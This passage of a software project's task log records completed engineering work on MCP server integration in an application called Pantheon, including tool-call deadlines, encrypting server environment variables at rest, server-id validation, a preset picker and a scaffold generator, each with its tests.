  `result = await session.call_tool(tool_name, arguments)`, and the SDK's own
  `read_timeout_seconds` defaults to `None`, which becomes `anyio.fail_after(None)` —
  not a deadline, a no-op scope (`mcp/shared/session.py:285-291`, mcp 1.30.0). Driven:
  `HEAD`'s real `McpManager` with a session whose `call_tool` awaits
  `asyncio.sleep(3600)` was **still pending** when an external 3-second bound gave up.
  There is no argument that makes it return. That await is the agent's turn
  (`src/tool_execution.py:1345/1360`) and the scheduler's delivery path
  (`src/task_scheduler.py:2710/3588`), so one hung tool hung both — silently, because no
  exception was ever raised.
  Two layers, and the second is the one that makes it enforceable. The SDK's own
  `read_timeout_seconds` gets the deadline (`Law 14` — it already exists, and it stops
  waiting on the response stream and raises `McpError(408)` instead of cancelling the
  caller, which keeps the session usable afterwards); `asyncio.wait_for` gets deadline +
  2s and covers what the SDK's timer cannot see — a session object that ignores the
  argument, a stall before the response wait. Measured after, same hung session: **1.00s**
  with an SDK-shaped session (graceful layer fires first), **3.00s** with one that ignores
  the argument (backstop), against a 1s deadline. Against a real FastMCP server whose
  tool calls `time.sleep(3600)`: `pantheon-mcp call ... hang --timeout 2` returns in
  ~2.0s with `"timed_out": true`, and the connection still closes cleanly afterwards.
  Default **120s** for the agent turn — every existing caller passes no timeout and so
  inherits it, which is the point, the hang was on the default path. **30s** for the
  interactive route (a person is waiting). Ceiling **600s**, and `0`, `-1`, `None`, `""`,
  `"forever"` and `10**9` all resolve to a bound: *there is no spelling of "no timeout"*,
  because that is the state this replaces.
  One behavioural decision worth recording: a timeout raises a distinct `McpCallTimeout`
  and **does not take the built-in reconnect-and-retry path**. That path exists for a
  subprocess that died; a hung tool is not a dead subprocess, and retrying it spends a
  second full deadline to learn the same thing — four minutes of silence on the default
  instead of two. A genuinely crashed built-in is still reconnected and retried, pinned
  by its own test.
  `Verify:` an operator whose MCP server has stopped answering runs `pantheon-mcp call
  <id> <tool>` and gets, within two minutes, a sentence naming the tool and the number of
  seconds it was given — instead of a shell that never returns; and the same server
  called from a chat turn no longer wedges the turn.
  `CI:` `tests/test_mcp_call_has_a_deadline.py` (19 cases, drives `McpManager`, including
  the `Law 1` cases: a normal call, a tool error, a crashed built-in),
  `tests/cli/test_mcp_cli_call_and_update.py` (real hung server). — agent:`p8core`
- [x] **P8-38** Keep the handshake. The initialize result is discarded at exactly three
  connect sites; it carries server name and version, protocol version, advertised
  capabilities and the server's own instructions, and **nothing in the app records any of
  it.** One line each. **Done 2026-09-19. Exactly three, re-counted, and the row's
  description of the payload is right.**
  At `HEAD` all three sites spelled it `await session.initialize()` — a statement, not an
  assignment: `src/mcp_manager.py:296` (stdio), `:365` (SSE), `:452` (HTTP). Driven
  against the SDK's real `InitializeResult`, what was being dropped is `serverInfo`
  (`name`, `version`, `title`), `protocolVersion`, `capabilities` and `instructions`.
  `get_server_status` returned `{status, name, transport, tool_count}` and nothing above
  it could have shown any of the rest, because none of it existed anywhere.
  It is one line each, as the row said: `summarize_initialize_result`
  (`src/mcp_manager.py:346`) takes the result and returns plain JSON, and each site
  merges it into its connection record. The summary is defensive about a third party's
  data — names and versions go through `_sanitize_schema_token`, capabilities are reduced
  to the advertised feature names, `instructions` is capped at 2000 characters — and a
  field the server did not send is **absent** rather than present and empty, so a caller
  can tell "not advertised" from "advertised as nothing".
  **What can be shown now that could not be before.** Three things, all reachable without
  reading source. (1) `manage_mcp list` (`src/agent_tools/admin_tools.py:240-256`)
  reports `server_name`, `server_version`, `protocol_version`, `capabilities` and
  `instructions` beside the operator's own label, so asking the assistant *"what MCP
  servers do I have"* now answers with what the software on the other end calls itself
  rather than only with what was typed into the form. (2) `GET /api/mcp/servers` carries
  the same fields, which is the payload the Settings list is drawn from — the browser
  half is `static/**` and is not in this patch. (3) `instructions` is the one handshake
  field the MCP spec has the server write **for the model**, and it now reaches the
  system prompt: `get_tool_descriptions_for_prompt` emits
  `(server instructions: …)` under the server's heading, whitespace-collapsed and capped
  at 600 characters because the prompt pays for it on every turn. Before this the agent
  got a server's tool list and never the note the server wrote to go with it.
  `Verify:` an operator with a connected MCP server asks the assistant what that server
  is and is told its own name and version and the protocol it negotiated — e.g.
  `filesystem-mcp 1.4.2, protocol 2025-06-18, capabilities: tools` — none of which
  appeared anywhere in the product before; and a server whose `instructions` say *"call
  read_file before write_file"* has that sentence in front of the model when it chooses.
  `CI:` `tests/test_mcp_connect_keeps_the_handshake.py` (20 cases; the handshake half is
  parametrised over all three transports against the SDK's real `InitializeResult`, plus
  a server that advertises nothing adding nothing, the prompt line and its bound, the
  status clearing on disconnect, and two `P8-00` cases that drive `manage_mcp list` and
  `GET /api/mcp/servers` for the fields a person actually reads). Mutation-checked:
  discarding the result again fails 8 of 20. `Depends:` nothing. — agent:`p8conn`
- [x] **P8-39** **Encrypt server env vars — storage only.** Measured before:
  `core/database.py:585` at `HEAD` was `env = Column(Text, nullable=True)`, and it was
  the **only secret-bearing column in the schema encrypted at no layer**. Six were
  `EncryptedText` — `model_endpoints.api_key` (`:533`),
  `provider_auth_sessions.access_token`/`.refresh_token` (`:571-572`),
  `mcp_servers.oauth_tokens` (`:590`), `signatures.data_png`/`.svg` (`:655/:658`) — and
  five more are `Column(String)` encrypted by hand at their call sites
  (`email_accounts.imap_password`/`.smtp_password`/`.oauth_access_token`/
  `.oauth_refresh_token`, `webhooks.secret`). Eleven covered; `env` was the twelfth and
  it is where the tokens live: `GITHUB_TOKEN`, `BRAVE_API_KEY`, `GOOGLE_CLIENT_SECRET`.
  Nothing wrote it through `encrypt()` on any path — not `add_server`, not
  `manage_mcp add`, not `pantheon-mcp add` — so a stolen `app.db` handed over every MCP
  credential in the clear while every credential beside it held. `pantheon-mcp show`
  already redacted these values behind `--reveal`, so the product's own posture already
  called them secrets.
  Done with the encryption the schema already has (`Law 14`): the column becomes
  `EncryptedText`, the same bind/result decorator the other six use, over the same
  `src/secret_storage.py` Fernet key at `data/.app_key`. The SQL type stays TEXT, so
  **no wire or JSON shape changes** — every consumer still reads and writes a plain JSON
  string and still spells the read `json.loads(srv.env) if srv.env else {}`. Verified by
  driving the paths rather than reasoning about them: `McpManager._connect_with_timeout`
  still gets `{"GITHUB_TOKEN": ...}` as a dict, and `pantheon-mcp show` still redacts
  and still reveals.
  Existing rows are migrated, not orphaned. `decrypt()` passes an unprefixed value
  straight through, so a legacy plaintext row is readable the instant the new code
  starts and before any migration runs; `_migrate_encrypt_mcp_env()` (raw SQL, so the
  decorator is not applied twice; idempotent on the `enc:` prefix; `NULL` left `NULL`)
  rewrites them once, registered in `init_db` beside `_migrate_encrypt_endpoint_keys`. A
  wrong or rotated key costs a server its env (`decrypt()` returns `""`, which every
  consumer's `if srv.env` guard turns into `{}`), not the process.
  `Verify:` an operator adds an MCP server with an API key in its env exactly as before —
  same form, same CLI flag, same JSON — then runs `strings data/app.db | grep <their
  token>` and finds nothing, while the server still starts and its tools still answer.
  `CI:` `tests/test_mcp_env_encrypted_at_rest.py` (12 cases, including the token's bytes
  absent from a real on-disk SQLite file, the legacy-row read, the migration, its
  idempotence, its registration in `init_db`, and the rotated-key degradation).
  — agent:`p8core`
- [x] **P8-40** Capture `annotations` on the HTTP transport — stdio and SSE both do, HTTP
  does not, so a remote server gets no plan-mode read-only credit however it advertises
  itself. **Done 2026-09-19. Premise held; the cause was one line short of three
  copies.**
  Measured at `HEAD`: the per-tool record was built inline at all three connect sites and
  the HTTP one was written with three keys instead of four —
  `src/mcp_manager.py:302-309` (stdio, has `annotations`), `:370-378` (SSE, has it),
  `:456-461` (HTTP, does not). Driven: a `Tool` carrying
  `ToolAnnotations(readOnlyHint=True)` through `_connect_sse` reached
  `mcp_tool_is_readonly`; the same tool through `_connect_http` did not, so the same
  server was callable in plan mode over SSE and refused over Streamable HTTP.
  Fixed by deleting the copies rather than adding a fourth. `_tool_entries`
  (`src/mcp_manager.py:391`) is now the one builder and all three sites call it, so the
  next transport gets `annotations` without anyone remembering to. This is the same
  `Law 13` shape as `is_builtin`'s two spellings of `_BUILTIN_SERVERS`, and the same
  answer.
  `Verify:` an operator connects a remote MCP server over Streamable HTTP that advertises
  `readOnlyHint: true`, switches the chat to plan mode, and can call that server's
  read-only tools — which over SSE they always could and over HTTP they never could.
  `CI:` `tests/test_mcp_connect_keeps_the_handshake.py` (20 cases; the annotation half is
  parametrised over all three transports and drives the real `_connect_stdio`,
  `_connect_sse` and `_connect_http` against the SDK's real `Tool`, `ToolAnnotations` and
  `InitializeResult` models). The plan-mode case is built so the verb heuristic gets both
  annotated tools **wrong** on its own — `slurp_file` is not a read verb and
  `fetch_and_delete` is — so if `annotations` is dropped on any transport that
  transport's verdicts invert rather than merely weakening. `Depends:` nothing.
  — agent:`p8conn`
- [x] **P8-41** Fix the **two** stale comments claiming MCP is dropped in plan mode.
  **Done 2026-09-19. Re-counted from scratch and the live number was one, not two.**
  Re-ran the same multiline proximity scan across `src/`, `routes/`, `core/`, `services/`,
  `static/` and `docs/`: **31** `mcp` x `plan mode` proximity hits, up from the 23 the
  previous pass recorded, because that pass's correction added prose of its own. Three of
  the 31 contain the word "drop", and two of those three are that correction quoting the
  sentence it replaced (`src/tool_security.py:424` — *"MCP tools are handled separately,
  and **not** by dropping them"* — and `:426`, which quotes the old text inside the
  explanation). So on the tree this pass started from there was **one** live stale claim,
  not two: the row's count was right when it was written and half of it had already been
  fixed. Worth recording because anyone re-running this grep gets 3 and has to read all
  three to find the 1.
  (a) `src/tool_security.py:424-425` — fixed in the previous pass, unchanged here.
  (b) `routes/chat_routes.py:2046-2048` — *"(stream_agent_loop enforces this again +
  drops MCP, so this is belt-and-suspenders.)"* **Fixed.** `routes/chat_routes.py` is in
  this agent's ownership now, and the correction is the one clause the row specified:
  `drops MCP` → `filters MCP to read-only tools`. The claim it replaces was wrong about
  both layers. The route's own denylist contains no `mcp__` name at all; the loop keeps
  the manager (`src/agent_loop.py:4827-4830`, `if plan_mode and mcp_mgr:`) and filters it
  per tool through `plan_mode_blocked_mcp`, so read-only MCP tools stay callable — which
  is the point, plan mode is for investigating.
  **The third hit reads the same and is accurate, so it is still recorded rather than
  changed:** `src/tool_security.py:213` says the advertisement path compensates *"by
  dropping the MCP manager entirely (`agent_loop`)"*. That is the **non-admin** path, not
  plan mode — `blocked_tools_for_owner(owner)` non-empty → `mcp_mgr = None` at
  `src/agent_loop.py:4459`. Different question, different answer, and the answer there
  really is "dropped". It is not a fourth defect.
  `Verify:` a contributor reading either comment before changing plan-mode gating is told
  that MCP is filtered rather than dropped, and where the filter is — so they do not
  "restore" a drop that would remove read-only MCP investigation from plan mode.
  `CI:` `tests/test_mcp_plan_mode_is_filtered_not_dropped.py` (7 cases, up from 5). A
  test that grepped the comment would be testing the file (`Law 20`), so the two new
  cases pin what the corrected clause now claims: `plan_mode_disabled_tools()` — the list
  the route actually adds — contains no `mcp__` name, so the route never hid MCP by
  itself; and the union of that list with `plan_mode_blocked_mcp()`'s qualified set
  leaves a read-only MCP tool callable while blocking the write one beside it.
  `Depends:` nothing. — agent:`p8conn`
- [x] **P8-42** Fix the empty-env trap: an empty env dict yields `None`, so the SDK
  substitutes a minimal environment. **Premise corrected 2026-08-27, re-measured again
  2026-09-19 and it holds.** **`PATH` and `HOME` are not the casualties** — both are in
  `DEFAULT_INHERITED_ENV_VARS` and survive. Re-measured against the installed SDK: that
  list is exactly `['HOME', 'LOGNAME', 'PATH', 'SHELL', 'TERM', 'USER']`, six names, and
  `get_default_environment()` on this machine returns four of them. What vanishes is
  `PYTHONPATH`, `NODE_PATH`, the npm cache location and every proxy variable, and **only
  when the env dict is empty** — `src/mcp_manager.py:285` at `HEAD` read
  `env={**os.environ, **env} if env else None`, and `None` is not "no overrides" to the
  SDK, it is a request for the minimal environment. That is a narrower trap and a much
  harder one to diagnose: a server that resolves its interpreter fine and then cannot
  find its own packages, or cannot reach the network from behind a corporate proxy. The
  tell that made it nearly undiagnosable is that **one unrelated variable fixes it** —
  `{"ANYTHING": "1"}` makes the dict truthy and the whole parent environment arrives —
  so two servers with the same command behave differently for a reason that is nowhere
  in either config.
  Fixed at `src/mcp_manager.py:640`: `env={**os.environ, **(env or {})}`. An empty dict
  now means what it says. A server that sets nothing and a server that sets one key
  inherit the same environment; an explicit override still wins.
  `Verify:` a generated server with an empty env dict inherits the parent's `PYTHONPATH`
  and proxy settings — driven end to end, not reasoned about: the test writes a real
  `FastMCP` server to a temp dir, starts it through the real `McpManager` over the real
  stdio transport with `env={}`, calls a tool on it and reads back the environment the
  subprocess actually got.
  `CI:` `tests/test_mcp_empty_env_still_inherits.py` (5 cases: the end-to-end inheritance
  of `PYTHONPATH`, `HTTPS_PROXY`, `NO_PROXY`, `NPM_CONFIG_CACHE` and an arbitrary
  sentinel for both `{}` and `None`; `PATH` and `HOME` still arriving, so the fix did not
  trade one half of the environment for the other; an explicit override still winning;
  and one case that states the SDK's behaviour as a fact, so the day the premise expires
  is loud rather than silent). Mutation-checked: restoring the `if env else None` fails
  3 of the 5. `Depends:` nothing. — agent:`p8conn`
- [x] **P8-43** Let `builtin_browser` auto-reconnect — the reconnect helper hard-returns
  false for anything outside a four-entry map, despite the browser server counting as
  built-in. A crashed Playwright server stays dead until a manual reconnect. **Done
  2026-09-19. The map is three entries, not four.**
  Re-measured: `_BUILTIN_SERVERS` holds `image_gen`, `rag`, `email`. `memory` was removed
  from it by `B67` and this row's count was never updated. Everything else held.
  `McpManager.call_tool` catches a failed call, asks `is_builtin(server_id)`, and on True
  reconnects and retries once; `is_builtin` returns True for anything starting
  `builtin_`, so `builtin_browser` takes that branch — and `_reconnect_builtin`
  (`src/mcp_manager.py:691` at `HEAD`) opened with `if server_id not in _BUILTIN_SERVERS:
  return False` against the **Python-script** map. The browser lives in
  `_BUILTIN_NPX_SERVERS`, so a crashed Playwright subprocess answered every later call
  with *"MCP server crashed and reconnect failed: builtin_browser"* until somebody opened
  Settings and pressed Reconnect.
  The cause was that "how does this built-in start" had two answers and only one of them
  was a function. Boot built the browser's launch line inline inside
  `register_builtin_servers._start_npx_servers` — the `_browser_mcp_args` rewrite that
  adds `--executable-path`, `--isolated` and `--no-sandbox`, the `XDG_CACHE_HOME` /
  `PLAYWRIGHT_BROWSERS_PATH` pair, the resolved npx binary — and the restart path could
  not see any of it. `builtin_connect_spec` (`src/builtin_mcp.py:209`) is now the single
  answer, covering both maps, and boot and restart both ask it (`Law 14`), so a change to
  how the browser starts reaches the restart as well.
  The npx cache gate is deliberately **not** repeated on the restart path: it exists so a
  fresh install does not reach registry.npmjs.org uninvited (`Law 16`, and
  `BROWSER_MCP_REQUIRE_CACHE`), and a server that was running a second ago is already on
  disk. A built-in whose script has since been deleted is refused with a log rather than
  a spawn.
  `Verify:` a person whose browser automation has crashed mid-session asks for another
  page and gets it — the next tool call restarts Playwright and completes, instead of
  returning *"MCP server crashed and reconnect failed"* until they find Settings →
  Integrations → Reconnect.
  `CI:` `tests/test_builtin_mcp_browser_reconnects.py` (10 cases, driving the public
  entry point: a crashed session, one failed call, a reconnect and a successful retry;
  the restart's connect kwargs compared **field by field against the real boot path's**,
  with `register_builtin_servers` actually run, so the two cannot drift; the three Python
  built-ins still reconnecting; a stranger still refused; a missing script refused
  without a spawn). Mutation-checked: making `builtin_connect_spec` forget the npx map
  fails 3 of 10. `Depends:` nothing. — agent:`p8conn`
- [x] **P8-44** Server-id validation. One `split("__", 2)` is the sole parse of the
  namespaced name; **an id containing `__` routes the call to the wrong server.**
  Unreachable today because ids are uuid4-derived — the moment a Creator lets people name
  servers, this field holds the invariant. **Done 2026-09-19.**
  Measured at `HEAD`: `src/mcp_manager.py:573` was the only place `mcp__<server>__<tool>`
  was taken apart, and no code anywhere held the invariant that makes that parse correct.
  The failure is not an error, it is a misroute, and it is shown rather than argued in
  the test: `qualify_mcp_tool_name("a__b", "t")` and `qualify_mcp_tool_name("a",
  "b__t")` are the same string, `mcp__a__b__t`, and the parse resolves it to server `a`
  every time — so tools of a server named `a__b` would execute against a server named
  `a` if one existed.
  The invariant is held where ids enter the manager, not where they are minted:
  `McpManager.connect_server` validates `server_id` before dispatch, so the admin route,
  `manage_mcp add`, `scripts/pantheon-mcp`, `connect_all_enabled` on boot and the
  built-ins all get the rule without any of them restating it (`Law 13`).
  `validate_mcp_server_id` (`:170`) refuses the separator with a sentence that says what
  would have happened and what to write instead, and refuses empty, whitespace-padded,
  over-64-character and non-`[A-Za-z0-9._-]` ids on the way past. The parse itself is now
  a named function, `split_mcp_tool_name` (`:205`), and `qualify_mcp_tool_name` (`:198`)
  is the one spelling of the build — three inline f-strings collapsed into it — so the
  builder and the parser cannot disagree. `maxsplit=2` stays, and the comment now says
  why it is correct: the **server** may not hold the separator, the **tool** still may,
  and a third-party server is free to ship a tool called `files__read`.
  This is a validation row and it added validation only: no existing command, arg or env
  rule was touched, and `FORBIDDEN.md` Part 2's MCP command/arg/env controls are
  re-asserted in the same test file.
  `Verify:` nothing changes for any server that exists today — every `uuid4[:8]` id, the
  CLI's full `uuid4`, and all four built-in ids are accepted, pinned by a case that runs
  200 real uuid4s through the rule — and a server registered with `a__b` as its id is
  refused at registration with *"contains '__', which is the separator in the tool name
  `mcp__<server>__<tool>`"* instead of silently sending its calls somewhere else.
  `CI:` `tests/test_mcp_registration_invariants.py` (the `P8-44` half: the collision
  demonstrated by driving `qualify_mcp_tool_name` and `split_mcp_tool_name`; the refusal,
  asserting **no transport was opened**, with `stdio_client` and `sse_client` patched to
  raise if reached; ten bad ids, eight good ones including all four built-ins; eight
  malformed qualified names driven through `call_tool`). `Depends:` nothing.
  — agent:`p8conn`
- [x] **P8-45** Surface the **15**-entry preset catalogue (14 with setup walkthroughs) currently sitting in **420** lines of unreachable code. Its two entry points look up DOM ids no template has ever rendered. `Depends:` P2-20. — **done 2026-09-27, inside the MCP form (`D-2026-09-27-01`). The counts held; the location had drifted, and one premise in the decision was false in a way the tests now pin.**
  **Re-measured before a line was written.** Fifteen presets, fourteen with a `help` walkthrough (Memory has none), by a balanced-bracket parse of the array, at `static/js/admin.js:1854-1920` — not `1793-1859`; the file had grown 61 lines above it. They fed `initMcpForm`, which returns on `adm-mcpCommand`, and `loadMcpServers`, which returns on `adm-mcpList`; no template in this tree renders either, and `.pantheon/check-wiring.py`'s `ABSENT_BY_DESIGN` declares all fourteen `adm-mcp*` ids absent. Catalogue plus the unused `_GOOGLE_OAUTH_HELP` is 78 lines, the list and the form 348 — **426**, so "420" was within rounding. "Has **ever** rendered" cannot be checked: this clone is four commits deep. "Renders in this tree" was measured.
  **One home (`Law 7`).** `static/js/settings/mcpPresets.js` (new, 461 lines) holds `MCP_PRESETS`; `admin.js` imports it and keeps no copy (its dead `initMcpForm` reads the same array). **One form (`Law 14`).** A "Start from" select sits above Name in the form `P8-46` rebuilt (`static/js/settings.js:5683`, wired at `:5755`). Choosing a preset fills that form's own Name, Transport, Command, Arguments and Environment — the controls the existing Save reads — and draws, in place and as text, "Filled in below. Nothing is added until you press Save.", what the person must fill in (`You fill in: GITHUB_PERSONAL_ACCESS_TOKEN.`), the setup steps, and — for every `npx` preset — that npx downloads the package from the npm registry the first time it starts (`Law 16`: what reaches out is said before it is saved; the picker itself fetches nothing). The walkthroughs now name this form's button and boxes (`Save`, `GITHUB_PERSONAL_ACCESS_TOKEN below`) instead of the dead form's (`Add Server`, "Github Personal Access Token").
  **A secret is marked, never faked.** An environment variable a preset ships empty reaches `P8-46`'s editor as an empty box marked as needed (placeholder, `aria-required`, `data-mcp-needs`), and Save refuses it on its own field — *"GITHUB_PERSONAL_ACCESS_TOKEN needs your value"*, nothing sent — until it is filled. Postgres shipped `postgresql://user:pass@localhost/db` as an argument that read as a working value; it is an empty, marked argument now, and its walkthrough says the package takes the URL as an argument, so it shows in the process list. The Email preset no longer pre-fills Migadu's hosts before a provider is chosen. A marked row the person removes with × is not demanded; a plain `setValue` carries no marks. Nothing typed is cleared: "Nothing", and switching the form to SSE/HTTP, stop the preset (its steps, its verdict, its Google extras) and leave every field alone; a Name the person typed survives a change of preset.
  **"Would this install refuse it" — premise corrected, and both halves are now said.** The decision asked the picker to say so if a preset's command would be refused by this install's MCP validation, reusing `P8-47`'s prediction. Driven: the form saves through `POST /api/mcp/servers`, which has **no command rule** — `P8-47` pins that the admin route accepts what the agent path refuses — so **no preset is refused on Save**; `manage_mcp add` runs `_validate_mcp_command`, and every preset starts `npx`, which is in `_MCP_DENIED_COMMANDS` and cannot be opted in through `PANTHEON_MCP_ALLOWED_COMMANDS` — so **every preset is refused on the agent path**. Both are driven over the whole catalogue in the tests. So `POST /api/mcp/check` (`routes/mcp/mcp_routes.py:400`, `require_admin`, mapped `superuser` in `P11-AUTH-MAP.md`) answers the two things a person can act on, each an enum (`Law 10`): `launcher` `found`/`missing` — `which_tool` on this machine, which is the refusal that really bites on the form's path, a spawn that cannot find `npx` — and `assistant` `accepted`/`refused` with `_validate_mcp_command`'s own `reason`, asked of the rule itself exactly as `refusal_on_the_agent_path` asks it, never a copy. The picker asks the moment a preset is chosen and prints *"npx is installed on this machine."* and *"Only an administrator can add this, from this form. Asked to, the assistant refuses: “command 'npx' is not allowed on the agent MCP path: …”"*; a failed check says *"Couldn't check this install (…). You can still save."*; a verdict is cleared the moment the Command box stops matching it; a slow answer for an earlier choice is dropped. `FORBIDDEN.md` Part 2's command/arg/env validation is read and not touched.
  **Two defects in the live form, found through the picker and fixed.** (1) Gmail could not work from Settings at all: `oauth_file` and `oauth_config` were only ever sent by the unreachable admin form. The picker's `saveExtras` sends them (ported from that form's save, `static/js/settings.js:5817`). (2) An add the server accepted but could not connect said **"Saved"** and closed the form — a rejected token, a missing `npx` and a Gmail server waiting for Google all read as done. It now opens the server's own page (`:5842`), which says *"Error: …"* with Reconnect or *"Needs authorization"* with Authorize.
  `Verify:` someone who has never registered an MCP server opens Settings → Integrations → + → MCP Tool Server, picks **GitHub** under "Start from", reads the three steps and "You fill in: GITHUB_PERSONAL_ACCESS_TOKEN.", sees whether `npx` is installed and that the assistant could not have done this for them, presses Save with the token box empty and is told *"GITHUB_PERSONAL_ACCESS_TOKEN needs your value"* on the Environment field with nothing sent, pastes a token, saves, and lands on the server's own page — Connected, or the error beside Reconnect. `CI:` `tests/test_a_preset_fills_the_mcp_form_js.py` (**28**, under node against the real `mcpPresets.js` and `mcpFields.js`; the live form's own `presetPicker` binding is cut out of `settings.js` by `js_binding` and run against a recording `fetch` — the mount and two save lines, which a shim that does not parse `innerHTML` cannot reach, are asserted inside `showMcpForm` only) and `tests/test_mcp_preset_launch_check.py` (**14**, the route driven: the rule's own sentence, the allowlist moving the answer, `npx` staying refused whatever the allowlist says, the launcher on `PATH` and at a path, nothing stored or started, the admin gate, and all fifteen presets accepted by `POST /api/mcp/servers` and refused on the agent path). **All 42 red at `HEAD`.** **Mutation: 40 run, 40 caught** — needs never marked, `needs.args` ignored, Postgres faked again, a token shipped filled in, a walkthrough saying Add Server, either form event not dispatched, a typed name overwritten, "Nothing" clearing fields or keeping extras, `oauth_file` losing the secret, `oauth_config` not sent, a provider chosen for the person, a provider change dropping typed values, steps drawn as markup, the npm note gone, the install never asked, a stale verdict kept, a slow answer not dropped, a failed check silent, a missing launcher read as found, the rule's reason unquoted, the module fetching on its own, the editor skipping needs / losing them in JSON mode / keeping old marks / no `aria-required` / demanding a removed row, `settings.js` wiring the wrong box / posting elsewhere / not sending extras / bare "Saved" / not mounting, the route's verdict not from the rule / launcher always found / path ignoring the execute bit / admin gate dropped / empty command accepted, and `admin.js` keeping its own copy. `tests/test_security_regressions.py::test_gmail_mcp_preset_uses_contained_oauth_paths` follows the catalogue to its new file, assertions unchanged. `Depends:` `P2-20`, `P8-46`. — agent:`p8-workshop`
- [x] **P8-46** Replace the single-line JSON inputs — a parse failure is caught and **silently discarded**, posting empty args and env, after which the server fails to connect for a reason nothing explains. — **done 2026-09-19. Half the premise was already fixed and the half in the headline had never been touched.** The silent discard went on 2026-09-13 with `1dc03f5`: both catches in `settings.js` and the server's `_parsed_json_field` (`routes/mcp/mcp_routes.py:206-216`) got a `return`, pinned by `tests/test_a_server_you_could_not_start_is_not_added.py`. What survived is what the headline asks for — **the inputs were still single-line JSON**, `static/js/settings.js:5624-5625`, two `<input>` elements whose placeholders (`["-y", "@modelcontextprotocol/server-filesystem"]`, `{"KEY": "value"}`) are wider than the boxes that hold them, so a person with two arguments had to write a JSON array by hand and was answered with *"Args must be valid JSON, e.g. `["-y", "pkg"]`"* in an 11px span shared with every other message on the card, 140px below the box it was about. That names the field and then repeats the format's name at somebody who has just failed to produce it: no *where*, no *what*. **And a third defect in the same handler, not in the row:** `settings.js:5686` read `r.status` and threw `data` away, so `add_server`'s own 400 `detail` — written to be read, naming the field and the shape that would have worked — rendered as **`Failed (400)`**, while the *unreachable* Admin form in the other file printed `data.detail` (`static/js/admin.js:2460`, dead since `initMcpForm` returns at `admin.js:2269` on a DOM id no template renders). Two copies of one thing, disagreeing, with the live one worse — `Law 13`. **What shipped.** `static/js/settings/mcpFields.js` (new, 959 lines) holds the field: one box per argument, one KEY/value pair per variable, `+ Add` and `×`, nothing to quote or balance; the JSON textarea is kept behind a **Paste JSON** link as a second *mode of the same field* rather than a second field (`Law 1` keeps the raw route, `Law 14` keeps it one field). A paste that will not parse is read by `readJsonTypo`, which is independent of `JSON.parse`'s message on purpose — V8 says `Unexpected token '-', "[-y, pkg]" is not valid JSON`, SpiderMonkey says `expected property name or '}' at line 1 column 2`, JavaScriptCore says neither, so an engine's sentence can be neither shown nor asserted on. Seven readings, each with a caret under the offending character and a line/column: single quotes, curly quotes from a web page or a word processor, an unquoted word (named back), a trailing comma, an unclosed string, an unbalanced bracket with both counts, and `KEY=value` shell syntax in the Env field. Entry types are checked too, which the server does not do (see the new defect below). A refusal is drawn **inside the field it is about**, `role="alert"`, `aria-invalid` on the control, and **nothing typed is ever cleared** — the mode switch refuses rather than dropping back to empty boxes. `describeServerRefusal` puts the server's own sentence on the named field, verbatim. A line under the form says `Pantheon will run: npx -y @modelcontextprotocol/server-filesystem`, live, which is the one thing nobody could work out from "Command" plus "Arguments". `Law 14` held: this is `settings.js:5481`'s form getting better, not a second form — no new surface, no new route, one changed `innerHTML` block and one changed click handler. `Verify:` someone who has never registered an MCP server, and has never written JSON, opens Settings → Integrations → + → MCP Tool Server, types `npx`, then `-y` and a package name into two boxes, reads the command line that will be run back to themselves, and gets a working server; and if they paste a config with single quotes in it they are told *"Single quotes — JSON has no single-quoted strings"* with a `^` under the quote, on the Arguments field, with their paste still in the box. `CI:` `tests/test_the_mcp_form_names_the_field_js.py` (44 cases, driven under node against the real module — no case greps a file), plus `tests/test_a_server_you_could_not_start_is_not_added.py` (17, two rewritten to the new shape and one added for the discarded `detail`). `Depends:` nothing. — agent:`p8ui`
- [x] **P8-47** Scaffold generator, writing to the **data volume** — the source tree is baked into the image with no bind mount, so generated servers cannot be built-ins and must register as ordinary rows with an absolute path. **That path is denied on the agent's registration path by design.** Author here; register through the admin route. **Do not weaken the command validation** — it closes a reported RCE and is pinned by 10 tests. — **done 2026-09-19. Every constraint in the row is true; all three were re-measured before a line was written, and the command validation is not merely untouched — it is now pinned from a second side.**
  **What was there before: nothing, and the gap is the first step rather than a missing option.** `scripts/pantheon-mcp` has nine subcommands — `list`, `show`, `enable`, `disable`, `add`, `update`, `tools`, `call`, `delete` — and every one of them takes a server that already exists; the Settings form `P8-46` rebuilt asks for a Command and Arguments a person must already have. `git grep` over `src/`, `routes/`, `scripts/`, `static/` and `mcp_servers/` returns no template, no starter and no generator of any kind. So the product could manage MCP servers and could not produce one, and the step it could not do is the one where somebody who has never written an MCP server stops.
  **The three constraints, driven rather than taken on trust.** **(1)** `docker-compose.yml:7` mounts `${APP_DATA_DIR:-./data}:/app/data` and nothing else, so a file written beside `mcp_servers/memory_server.py` is gone at the next image pull while the `mcp_servers` row pointing at it survives — the database is on the volume and the source tree is not. **(2)** `_BUILTIN_SERVERS` (`src/builtin_mcp.py:101-105`) is a fixed map of three app-root-relative script paths connected at startup, so a generated server cannot be one without editing the image; and `scripts/pantheon-deploy:379` globs `mcp_servers/*_server.py` and imports every match in a fresh interpreter as a deploy gate (`B131`'s probe), so a file dropped in there would also become a gate dependency for something the image does not carry. **(3)** A generated Python server is therefore `<interpreter> <absolute path>`, and `_validate_mcp_command` refuses **both halves** — driven 2026-09-19: `/usr/bin/python3` and `/app/venv/bin/python` each answer *"command must be a bare executable name, not a path"*, and bare `python3`/`python` answer *"…is not allowed on the agent MCP path: interpreters, runtimes, package runners, and shells can execute arbitrary code. **Register such a server via the admin route instead.**"* The validator's own last sentence is this row's instruction, which is why the module quotes it rather than paraphrasing it.
  **So the module registers nothing at all.** `src/mcp_scaffold.py` (new, 866 lines) writes the files, starts them, and hands back the admin route's fields. `refusal_on_the_agent_path()` does not carry a copy of the rule — it calls `_validate_mcp_command` and prints what comes back, so an operator who opts a launcher in through `PANTHEON_MCP_ALLOWED_COMMANDS` gets *"Nothing — on this install manage_mcp would accept this registration"* instead of a stale sentence (`Law 13`; pinned by a test that flips the env var and watches the sentence change). Nothing in `src/agent_tools/admin_tools.py`, `routes/mcp/**` or `src/mcp_manager.py` was edited — they are read and called.
